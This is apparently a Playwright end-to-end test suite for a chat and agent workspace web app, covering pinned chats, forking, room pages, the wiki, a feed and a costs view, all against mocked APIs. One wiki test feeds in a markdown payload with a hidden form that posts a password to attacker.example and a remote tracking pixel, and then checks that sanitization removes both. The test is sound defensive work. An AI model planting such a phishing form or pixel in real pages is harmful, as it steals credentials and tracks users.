import { test, expect } from '@playwright/test'

const BASE = process.env.FEATHER_URL || 'http://localhost:4870'

test.beforeEach(async ({ page }) => {
  await page.route('**/api/**', route => {
    const p = new URL(route.request().url()).pathname
    const body = p === '/api/rooms' ? { rooms: [] } : p === '/api/chat-pins' ? { pins: [], archived: [] } : p === '/api/sessions' ? { sessions: [] } : p === '/api/sidecar' ? { groups: [] } : p === '/api/boxes' ? { boxes: [] } : p === '/api/sharing/peers' ? { peers: [] } : p === '/api/agents' ? { agents: [] } : p === '/api/quick-links' || p === '/api/starred' ? [] : { messages: [] }
    return route.fulfill({ json: body })
  })
  await page.route('**/api/feed', route => route.fulfill({
    json: { items: [], following: [], generatedAt: '2026-09-05T12:00:00Z' },
  }))
})

test('finds an existing chat from the pinned home without duplicate rows', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  const chat = { id: 'marriage-chat', title: 'Marriage plans', updatedAt: '2026-08-22T12:00:00Z', isActive: false, agent: 'claude' }
  await page.route('**/api/sessions?*', route => route.fulfill({ json: { sessions: [chat] } }))
  await page.route('**/api/chat-pins', route => route.fulfill({ json: { pins: [{ id: chat.id, title: 'Marriage', legacy: true }], archived: [] } }))
  await page.goto(BASE)
  await expect(page.getByRole('region', { name: 'Pinned chats', exact: true })).toContainText('Marriage')
  await expect(page.getByRole('region', { name: 'Recent chats', exact: true })).not.toContainText('Marriage plans')
  await page.getByRole('searchbox', { name: 'Search chats', exact: true }).fill('Marriage')
  await expect(page.getByRole('button', { name: /Marriage plans/ }).first()).toBeVisible()
  await page.getByRole('button', { name: /Marriage plans/ }).first().click()
  await expect(page).toHaveURL(/#marriage-chat$/)
})

test('legacy chat deep links retain isolated fork lineage', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  const createdId = '11111111-2222-4333-8444-555555555555'
  const forkedId = '66666666-7777-4888-8999-aaaaaaaaaaaa'
  let forked = false
  let forkBody = null
  const listedSessions = () => [
    { id: createdId, title: 'RL', updatedAt: new Date().toISOString(), isActive: true, agent: 'omp', roomAssigned: true },
    ...(forked ? [{ id: forkedId, title: 'RL inventory branch', updatedAt: new Date().toISOString(), isActive: true, agent: 'omp', roomAssigned: true }] : []),
  ]
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
    name: 'trading', cwd: '/home/user/rooms/trading', active: false,
    latest: null, updatedAt: null, leaderSessionId: null, residents: [], sessions: [],
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
  }] } }))
  await page.route('**/api/sessions', route => route.fulfill({ json: { sessions: listedSessions() } }))
  await page.route('**/api/sessions?*', route => route.fulfill({ json: { sessions: listedSessions() } }))
  await page.route(`**/api/sessions/${createdId}/room`, route => route.fulfill({
    json: { room: 'trading', kind: 'chat', role: null, label: 'RL' },
  }))
  await page.route(`**/api/sessions/${createdId}/fork`, async route => {
    forkBody = JSON.parse(route.request().postData() || '{}')
    forked = true
    await route.fulfill({ json: {
      id: forkedId, status: 'starting', room: 'trading', workspaceMode: forkBody.workspaceMode,
      workspacePath: '/tmp/fork-worktree', notice: null,
    } })
  })
  await page.route(`**/api/sessions/${forkedId}/room`, route => route.fulfill({
    json: {
      room: 'trading', kind: 'chat', role: null, label: 'RL inventory branch',
      forkOf: createdId, forkSourceTitle: 'RL', workspaceMode: 'isolated', forkBranch: 'feather/fork-66666666',
    },
  }))

  await page.goto(`${BASE}/#${createdId}`)
  await expect(page.getByTestId('room-chat-breadcrumb')).toContainText('#trading / RL')

  await page.locator('button').filter({ hasText: '⋮' }).click()
  await page.getByTestId('fork-chat').click()
  await expect(page.getByTestId('fork-dialog')).toBeVisible()
  await expect(page.getByTestId('fork-workspace-isolated')).toHaveAttribute('aria-pressed', 'true')
  await page.getByTestId('fork-title').fill('RL inventory branch')
  await page.screenshot({ path: 'test-results/room-fork-dialog-mobile.png', fullPage: true })
  await page.getByTestId('fork-submit').click()
  await expect(page).toHaveURL(new RegExp(`#${forkedId}$`))
  expect(forkBody).toEqual({ title: 'RL inventory branch', workspaceMode: 'isolated' })
  await expect(page.getByTestId('fork-lineage')).toContainText('Forked from RL')
})

test('a migrated pin opens the durable Leader rather than a newer worker', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  const leader = { id: 'leader-human-chat', title: '#feather Leader', updatedAt: '2026-08-23T23:00:00Z', isActive: false, agent: 'omp' }
  const pulse = { id: 'pulse-chat', title: 'Status: #feather', updatedAt: '2026-08-24T01:00:00Z', isActive: true, agent: 'omp' }
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{ name: 'feather', leaderSessionId: leader.id, sessions: [pulse, leader] }] } }))
  await page.route('**/api/chat-pins', route => route.fulfill({ json: { pins: [{ id: leader.id, title: 'Feather', legacy: true }], archived: [] } }))
  await page.goto(BASE)
  const pinned = page.getByRole('region', { name: 'Pinned chats', exact: true })
  await expect(pinned).toContainText('Feather')
  await expect(pinned).not.toContainText('Status:')
  await pinned.getByRole('button', { name: /^Feather/ }).click()
  await expect(page).toHaveURL(/#leader-human-chat$/)
})

test('Wiki presents caretaker synthesis and never exposes the raw Updates feed', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  let updateRequests = 0
  let remoteMediaRequests = 0
  await page.route('https://attacker.example/**', async (route) => {
    remoteMediaRequests++
    await route.abort()
  })
  await page.route('**/api/rooms', async (route) => {
    await route.fulfill({ json: { rooms: [{
      name: 'meta', cwd: '/srv/rooms/meta', active: false, latest: null, updatedAt: '2026-08-22T13:30:00Z',
      updates: { count: 2, latestAt: '2026-08-22T13:30:00Z', latest: 'RAW COPIED TWEET' },
      friction: { count: 0, latestAt: null, latest: null },
      pulse: { enabled: true, status: 'waiting', lastRunAt: null, nextRunAt: '2026-08-22T13:45:00Z', sessionId: null },
      sessions: [],
    }] } })
  })
  await page.route('**/api/wiki', async (route) => {
    await route.fulfill({ json: { pages: [{ source: 'room:meta', name: 'Home', size: 80, updatedAt: '2026-08-22T14:00:00Z' }] } })
  })
  await page.route('**/api/wiki/page**', async (route) => {
    await route.fulfill({ json: {
      name: 'Home',
      content: '# Meta knowledge\n\nThe caretaker synthesized the evidence into this durable conclusion.\n\n<style>body{display:none}</style><form action=\"https://attacker.example/steal\"><input name=\"password\"></form>![pixel](https://attacker.example/pixel)',
      updatedAt: '2026-08-22T14:00:00Z',
    } })
  })
  await page.route('**/api/rooms/meta/updates', async (route) => {
    updateRequests++
    await route.fulfill({ json: { updates: [{ id: 'u1', ts: null, text: 'RAW COPIED TWEET' }] } })
  })

  await page.goto(`${BASE}/#wiki`)
  const panel = page.locator('article.wiki-markdown')
  await expect(panel).toContainText('The caretaker synthesized the evidence')
  await expect(panel).not.toContainText('RAW COPIED TWEET')
  await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
  expect(updateRequests).toBe(0)
  await expect(panel.locator('style, form, input, img')).toHaveCount(0)
  expect(remoteMediaRequests).toBe(0)
})

test('legacy Room deep links scope friction to its source', async ({ page }) => {
  const rooms = ['health', 'family'].map(name => ({ name, cwd: '/srv/rooms/' + name, sessions: [], residents: [], friction: { count: name === 'health' ? 1 : 0 }, pulse: { enabled: false } }))
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms } }))
  await page.route('**/api/rooms/*/wiki', route => route.fulfill({ json: { pages: [] } }))
  await page.route('**/api/rooms/health/friction', route => route.fulfill({ json: { complaints: [{ id: 'f1', source: 'health', summary: 'Calendar login loop', evidence: 'OAuth callback returned 401' }], count: 1 } }))
  await page.route('**/api/rooms/family/friction', route => route.fulfill({ json: { complaints: [], count: 0 } }))
  await page.goto(`${BASE}/#room/health`)
  await expect(page.getByTestId('room-friction')).toContainText('Calendar login loop')
  await expect(page.getByTestId('room-friction')).not.toContainText('OAuth callback returned 401')
  await page.goto(`${BASE}/#room/family`)
  await page.reload() // Exercise a separately opened saved deep link.
  await expect(page.getByTestId('room-page-family')).toBeVisible()
  await expect(page.getByTestId('room-friction')).not.toContainText('Calendar login loop')
})

test('Super Feed filters attention, subscriptions, and friction without exposing raw evidence', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  await page.unroute('**/api/feed')
  const room = {
    name: 'trading', cwd: '/srv/rooms/trading', active: false,
    latest: { role: 'assistant', text: 'Risk review completed.' }, updatedAt: '2026-09-05T12:00:00Z',
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 0, latestAt: null, latest: null },
    pulse: { enabled: true, status: 'waiting', lastRunAt: '2026-09-05T12:00:00Z', nextRunAt: null, sessionId: null },
    leaderSessionId: 'trading-leader',
    residents: [{ role: 'leader', sessionId: 'trading-leader', agent: 'omp', title: '#trading Leader', status: 'waiting' }],
    sessions: [{ id: 'trading-leader', title: '#trading Leader', updatedAt: '2026-09-05T12:00:00Z', isActive: false, agent: 'omp', roomAssigned: true }],
  }
  const items = [{
    evidenceId: 'room:health:pulse:2026-09-05T12:30:00Z', kind: 'alert', room: 'health', title: '#health status failed',
    summary: 'Status check failed.', detail: 'Open the Room to investigate.', occurredAt: '2026-09-05T12:30:00Z',
    sourceHref: '/#health-leader', sourceState: 'available',
    status: 'needs review', needsReview: true, sessionId: 'health-leader',
  }, {
    evidenceId: 'friction:calendar-auth', kind: 'friction', room: 'health', title: '#health → #friction',
    summary: 'Calendar auth repeatedly expires.', detail: '401 from provider', occurredAt: '2026-09-05T13:00:00Z',
    sourceHref: '/api/rooms/health/friction#calendar-auth', sourceState: 'available',
    status: null, needsReview: false, sessionId: null, complaintId: 'calendar-auth',
  }, {
    evidenceId: 'publication:trading:market-brief-1', kind: 'update', room: 'trading', title: '#trading · Market brief',
    summary: 'A decision-ready market change.', detail: 'Primary evidence checked.', occurredAt: '2026-09-05T13:10:00Z',
    sourceHref: '/api/rooms/trading/publications/market-brief-1', sourceState: 'available',
    status: 'briefing', needsReview: false, sessionId: null, publicationId: 'market-brief-1',
    visualHref: '/api/rooms/trading/publications/market-brief-1/visual', visualAlt: 'A compact market-change chart.',
  }, {
    evidenceId: 'publication:trading:market-context-1', kind: 'update', room: 'trading', title: '#trading · Nearby context',
    summary: 'Useful evidence-backed context; no action is requested.', detail: null, occurredAt: '2026-09-05T13:09:00Z',
    sourceHref: '/api/rooms/trading/publications/market-context-1', sourceState: 'available',
    attention: 'by-the-way', status: 'by the way', needsReview: false, sessionId: null, publicationId: 'market-context-1',
  }]
  let following = ['trading']
  let failFeed = false
  await page.route('**/api/feed', route => failFeed
    ? route.fulfill({ status: 503, json: { error: 'temporary feed failure' } })
    : route.fulfill({ json: { items, following, cursor: 'cursor-1', generatedAt: '2026-09-05T13:00:00Z' } }))
  await page.route('**/api/feed/following', async route => {
    const body = JSON.parse(route.request().postData() || '{}')
    following = body.following ? [...new Set([...following, body.room])] : following.filter(name => name !== body.room)
    await route.fulfill({ json: { ok: true, following } })
  })
  await page.route('**/api/rooms/trading/publications/market-brief-1/visual', route => route.fulfill({
    contentType: 'image/png',
    body: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=', 'base64'),
  }))

  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [room] } }))

  await page.goto(`${BASE}/#updates`)
  await expect(page.getByRole('heading', { name: 'Super Feed' })).toBeVisible()
  const feed = page.getByTestId('super-feed')
  await expect(feed.getByText('Risk review completed.', { exact: true })).not.toBeVisible()
  await expect(feed.getByText('A decision-ready market change.', { exact: true })).toBeVisible()
  await expect(feed.getByText('Calendar auth repeatedly expires.', { exact: true })).toBeVisible()
  await expect(feed.getByAltText('A compact market-change chart.')).toBeVisible()
  await expect(feed.getByRole('link', { name: 'Published evidence ↗' }).first()).toHaveAttribute('href', /publications\/market-brief-1/)
  await expect(feed.getByText('Briefing', { exact: true })).toBeVisible()
  await expect(feed.getByText('By the way', { exact: true })).toBeVisible()
  await expect(feed.getByText('Useful evidence-backed context; no action is requested.', { exact: true })).toBeVisible()

  failFeed = true
  await feed.getByTestId('feed-refresh').click()
  await expect(feed.getByText('HTTP 503', { exact: true })).toBeVisible()
  await expect(feed.getByText('A decision-ready market change.', { exact: true })).toBeVisible()
  failFeed = false

  await feed.getByTestId('feed-tab-review').click()
  await expect(feed.getByText('Status check failed.', { exact: true })).toBeVisible()
  await expect(feed.getByText('Calendar auth repeatedly expires.', { exact: true })).not.toBeVisible()
  await expect(feed.getByText('A decision-ready market change.', { exact: true })).not.toBeVisible()
  await expect(feed.getByText('By the way', { exact: true })).not.toBeVisible()

  await feed.getByTestId('feed-tab-following').click()
  await expect(feed.getByText('A decision-ready market change.', { exact: true })).toBeVisible()
  await expect(feed.getByText('Calendar auth repeatedly expires.', { exact: true })).not.toBeVisible()
  await feed.getByTestId('feed-follow-trading').first().click()
  await expect(feed.getByTestId('feed-empty')).toContainText('Follow a Room from Latest')

  await feed.getByTestId('feed-tab-friction').click()
  await expect(feed.getByText('401 from provider', { exact: true })).toBeVisible()
  await expect(feed.getByText('calendar-auth', { exact: true })).toBeVisible()
  await page.screenshot({ path: 'test-results/super-feed-mobile.png', fullPage: true })
})

test('Costs tab shows provider limits and the token ledger, and lives at #costs', async ({ page }) => {
  const usage = {
    generatedAt: new Date().toISOString(), scanMs: 12, files: 3,
    windows: ['5h', '24h', '7d'].map((key, index) => ({
      key, label: `Last ${key}`, since: new Date().toISOString(),
      totals: { requests: 10 * (index + 1), input: 1_000_000, output: 50_000, cacheRead: 20_000_000, cacheWrite: 300_000, cost: 12.5 * (index + 1), costedRequests: 8 },
      byModel: [{ model: 'gpt-5.6-sol', provider: 'openai-codex', harness: 'omp', requests: 8, input: 900_000, output: 40_000, cacheRead: 19_000_000, cacheWrite: 200_000, cost: 12.5 * (index + 1), costedRequests: 8, lastAt: Date.now() }],
      byRoom: [{ room: 'ev-shop-815', requests: 10, input: 1_000_000, output: 50_000, cacheRead: 20_000_000, cacheWrite: 300_000, cost: 12.5, costedRequests: 8, lastAt: Date.now() }],
      bySession: [{ sessionId: 'ev-updater-session', harness: 'omp', room: 'ev-shop-815', model: 'gpt-5.6-sol', requests: 10, input: 1_000_000, output: 50_000, cacheRead: 20_000_000, cacheWrite: 300_000, cost: 12.5, costedRequests: 8, lastAt: Date.now() }],
      byHarness: [],
    })),
    providers: {
      anthropic: { windows: [{ name: 'five_hour', utilization: 0.42, resetsAt: new Date(Date.now() + 3_600_000).toISOString() }, { name: 'seven_day', utilization: 0.91, resetsAt: null }], tokenSource: 'omp', tokenExpiresAt: null, error: null, lastGoodAt: new Date().toISOString() },
      openrouter: { totalCredits: 20, totalUsage: 9.3, remaining: 10.7, usageDaily: 1.2, usageWeekly: 1.87, usageMonthly: 1.41, keyLimit: null, keyLimitRemaining: null, error: null, lastGoodAt: new Date().toISOString() },
      codex: { windows: [{ name: '7d', utilization: 0.52, resetsAt: null }], observedAt: new Date().toISOString(), credits: null, tokenExpiresAt: null, tokenExpired: true, error: 'Codex login expired; limits shown are from the last transcript that reported them' },
    },
  }
  let usageRequests = 0
  await page.route('**/api/usage*', route => { usageRequests++; route.fulfill({ json: usage }) })
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [] } }))
  await page.route('**/api/feed', route => route.fulfill({ json: { items: [], following: [], cursor: 'c', generatedAt: new Date().toISOString() } }))

  await page.goto(BASE)
  await expect(page.getByTestId('home-nav-chats')).toBeVisible()
  await expect(page.getByTestId('costs-view')).toHaveCount(0)
  await page.getByTestId('home-nav-costs').click()
  await expect(page.getByTestId('costs-view')).toBeVisible()
  await expect.poll(() => page.evaluate(() => location.hash)).toBe('#costs')

  const anthropic = page.getByTestId('limits-anthropic')
  await expect(anthropic).toContainText('5 hour')
  await expect(anthropic).toContainText('42%')
  await expect(anthropic).toContainText('91%')
  await expect(page.getByTestId('limits-openrouter')).toContainText('$10.70')
  await expect(page.getByTestId('limits-codex')).toContainText('Codex login expired')
  await expect(page.getByTestId('costs-view')).toContainText('$12.50')
  await page.getByTestId('costs-window-7d').click()
  await expect(page.getByTestId('costs-view')).toContainText('$37.50')
  await expect(page.getByTestId('costs-view')).toContainText('#ev-shop-815')

  // Refresh asks the server for a fresh scan; the view survives a reload at #costs.
  const before = usageRequests
  await page.getByTestId('costs-refresh').click()
  await expect.poll(() => usageRequests).toBeGreaterThan(before)
  await page.reload()
  await expect(page.getByTestId('costs-view')).toBeVisible()
  await page.getByTestId('home-nav-chats').click()
  await expect(page.getByTestId('costs-view')).toHaveCount(0)
  await expect.poll(() => page.evaluate(() => location.hash)).toBe('')
})

test('Updates open Wiki collections while legacy Room deep links retain mission and controls', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 })
  await page.unroute('**/api/feed')
  let paused = false
  const pauseCalls = []
  const room = () => ({
    name: 'ev-shop', cwd: '/srv/rooms/ev-shop', active: true,
    mission: 'Find the cheapest way to get an EV charger installed at the shop by October.',
    latest: { role: 'assistant', text: 'Leader finished work.' }, updatedAt: '2026-09-06T12:00:00Z',
    updates: { count: 0, latestAt: null, latest: null },
    friction: { count: 1, resolvedCount: 1, latestAt: '2026-09-06T11:00:00Z', latest: 'Permit portal times out' },
    pulse: { enabled: !paused, status: 'waiting', lastRunAt: '2026-09-06T11:30:00Z', nextRunAt: null, sessionId: null },
    leaderSessionId: 'ev-leader',
    residentsPaused: paused,
    residents: [
      { role: 'leader', sessionId: 'ev-leader', agent: 'omp', title: '#ev-shop Leader', status: 'waiting' },
      { role: 'caretaker', sessionId: 'ev-caretaker', agent: 'omp', title: 'caretaker', status: 'waiting', wakeIntervalMs: 900000, nextWakeAtMs: paused ? null : Date.now() + 600000, lastWakeAt: '2026-09-06T11:45:00Z', paused },
      { role: 'updater', sessionId: 'ev-updater', agent: 'omp', title: 'updater', status: 'working', wakeIntervalMs: 1800000, nextWakeAtMs: paused ? null : Date.now() + 1200000, lastWakeAt: null, paused },
      { role: 'marketer', sessionId: 'ev-marketer', agent: 'omp', title: 'marketer', status: 'waiting', wakeIntervalMs: null, nextWakeAtMs: null, lastWakeAt: null, paused },
    ],
    sessions: [
      { id: 'ev-leader', title: '#ev-shop Leader', updatedAt: '2026-09-06T12:00:00Z', isActive: true, agent: 'omp', roomAssigned: true },
      { id: 'ev-caretaker', title: 'caretaker', updatedAt: '2026-09-06T11:45:00Z', isActive: false, agent: 'omp', roomAssigned: true },
      { id: 'ev-updater', title: 'updater', updatedAt: '2026-09-06T11:50:00Z', isActive: true, agent: 'omp', roomAssigned: true },
      { id: 'ev-marketer', title: 'marketer', updatedAt: '2026-09-06T10:00:00Z', isActive: false, agent: 'omp', roomAssigned: true },
    ],
  })
  const items = [{
    evidenceId: 'publication:ev-shop:kickoff-plan', kind: 'update', room: 'ev-shop', title: '#ev-shop · Kickoff plan',
    summary: 'Three quotes by Friday, permit check first.', detail: null, occurredAt: '2026-09-06T09:00:00Z',
    sourceHref: '/api/rooms/ev-shop/publications/kickoff-plan', sourceState: 'available',
    status: 'briefing', needsReview: false, sessionId: null, publicationId: 'kickoff-plan',
  }, {
    evidenceId: 'friction:permit-portal', kind: 'friction', room: 'ev-shop', title: '#ev-shop → #friction',
    summary: 'Permit portal times out', detail: null, occurredAt: '2026-09-06T11:00:00Z',
    sourceHref: '/api/rooms/ev-shop/friction#permit-portal', sourceState: 'available',
    status: null, needsReview: false, sessionId: null, complaintId: 'permit-portal',
  }, {
    evidenceId: 'friction:slow-wiki', kind: 'friction', room: 'ev-shop', title: '#ev-shop → #friction',
    summary: 'Wiki page took a minute to load', detail: null, occurredAt: '2026-09-05T11:00:00Z',
    sourceHref: '/api/rooms/ev-shop/friction#slow-wiki', sourceState: 'available',
    status: 'resolved', needsReview: false, sessionId: null, complaintId: 'slow-wiki',
    resolvedAt: '2026-09-06T08:00:00Z', resolution: 'Cached the wiki index',
  }]
  await page.route('**/api/feed', route => route.fulfill({ json: { items, following: [], cursor: 'c1', generatedAt: '2026-09-06T12:00:00Z' } }))
  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [room()] } }))
  await page.route('**/api/rooms/ev-shop/friction', route => route.fulfill({ json: { count: 2, complaints: [
    { id: 'permit-portal', timestamp: '2026-09-06T11:00:00Z', source: 'ev-shop', summary: 'Permit portal times out', evidence: null, resolvedAt: null, resolution: null },
    { id: 'slow-wiki', timestamp: '2026-09-05T11:00:00Z', source: 'ev-shop', summary: 'Wiki page took a minute to load', evidence: null, resolvedAt: '2026-09-06T08:00:00Z', resolution: 'Cached the wiki index' },
  ] } }))
  await page.route('**/api/rooms/ev-shop/wiki', route => route.fulfill({ json: { pages: [{ name: 'Home', size: 80, updatedAt: '2026-09-06T10:00:00Z' }] } }))
  await page.route('**/api/rooms/ev-shop/wiki/page**', route => route.fulfill({ json: { name: 'Home', content: '# EV shop wiki\n\nThe cheapest installer so far is Volt Bros.', updatedAt: '2026-09-06T10:00:00Z' } }))
  await page.route('**/api/rooms/ev-shop/residents/pause', async route => {
    const body = JSON.parse(route.request().postData() || '{}')
    pauseCalls.push(body.paused)
    paused = body.paused
    await route.fulfill({ json: { ok: true, paused, residents: room().residents, residentsPaused: paused } })
  })
  await page.route('**/api/rooms/ev-shop/pulse', route => route.fulfill({ json: { enabled: !paused, status: 'waiting', lastRunAt: null, nextRunAt: null, sessionId: null } }))
  await page.route('**/api/sessions/ev-leader/**', route => route.fulfill({ json: { messages: [] } }))

  await page.goto(`${BASE}/#updates`)
  // The feed marks a resolved complaint and keeps the open one plain.
  const resolvedCard = page.getByTestId('feed-item-friction:slow-wiki')
  await expect(resolvedCard).toContainText('Resolved')
  await expect(page.getByTestId('resolved-slow-wiki')).toContainText('Cached the wiki index')
  await expect(page.getByTestId('feed-item-friction:permit-portal')).not.toContainText('Resolved')
  await page.route('**/api/wiki', route => route.fulfill({ json: { pages: [{ source: 'room:ev-shop', name: 'Home', size: 80 }] } }))
  await page.route('**/api/wiki/page**', route => route.fulfill({ json: { content: '# EV shop wiki\n\nThe cheapest installer so far is Volt Bros.' } }))
  // The collection chip opens the Wiki; saved Room deep links remain compatible.
  await page.getByTestId('feed-item-publication:ev-shop:kickoff-plan').getByTestId('open-room-ev-shop').click()
  await expect(page.locator('article.wiki-markdown')).toContainText('Volt Bros')
  await page.goto(`${BASE}/#room/ev-shop`)
  const roomPage = page.getByTestId('room-page-ev-shop')
  await expect(roomPage).toBeVisible()
  await expect(page.getByTestId('room-mission')).toContainText('cheapest way to get an EV charger')
  await expect(page.getByTestId('room-resident-caretaker')).toContainText('wakes in')
  await expect(page.getByTestId('room-resident-caretaker')).toContainText('every 15m')
  await expect(page.getByTestId('room-resident-updater')).toContainText('working now')
  await expect(page.getByTestId('room-resident-marketer')).toContainText('woken by the updater')
  await expect(page.getByTestId('room-cards')).toContainText('Kickoff plan')
  await expect(page.getByTestId('room-cards')).not.toContainText('Permit portal')
  await expect(page.getByTestId('room-friction')).toContainText('1 open · 1 resolved')
  await expect(page.getByTestId('wiki-content-ev-shop')).toContainText('Volt Bros')

  // Pause residents and status together; the page reflects it.
  await page.getByTestId('room-toggle-paused').click()
  await expect(page.getByTestId('room-toggle-paused')).toHaveText('Resume residents')
  await expect(page.getByTestId('room-resident-caretaker')).toContainText('paused')
  expect(pauseCalls).toEqual([true])

  // Reload retains the old deep link; Back returns to the new chat home.
  await page.reload()
  await expect(page.getByTestId('room-page-ev-shop')).toBeVisible()
  await page.getByTestId('room-page-back').click()
  await expect(page.getByTestId('chats-home')).toBeVisible()
  await expect(page.getByRole('heading', { name: 'Chats', exact: true })).toBeVisible()
  await page.goto(`${BASE}/#room/ev-shop`)
  await page.getByTestId('room-open-leader').click()
  await expect(page).toHaveURL(/#ev-leader$/)
})
